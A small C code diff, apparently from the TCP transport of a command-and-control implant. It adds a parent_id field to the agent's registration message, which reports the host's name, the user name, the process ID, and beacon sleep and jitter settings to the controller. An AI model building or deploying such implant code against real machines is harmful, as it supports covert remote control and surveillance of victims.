@@ -186,9 +186,9 @@ int transport_tcp_register(void) {
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"tcp\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"language\":\"c\"}",
+        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"parent_id\":\"%s\",\"language\":\"c\"}",
         hostname, username_j, (unsigned long)GetCurrentProcessId(),
-        AGENT_SLEEP_SEC, AGENT_JITTER_PCT);
+        AGENT_SLEEP_SEC, AGENT_JITTER_PCT, AGENT_PARENT_ID);
 
     if (!tcp_send_register(body)) return 0;
 
